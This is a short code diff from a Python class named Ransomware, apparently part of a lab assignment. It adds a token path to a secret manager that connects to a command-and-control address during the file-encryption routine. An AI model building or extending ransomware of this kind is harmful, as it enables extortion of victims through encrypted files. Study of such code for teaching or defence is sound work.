@@ -58,7 +58,7 @@ class Ransomware:
     def encrypt(self) -> None:
         # main function for encrypting (see PDF)
         self._log.info(ransomware.get_files("*.txt"))
-        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS)
+        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
         self._secret_manager.setup()
         return None
         
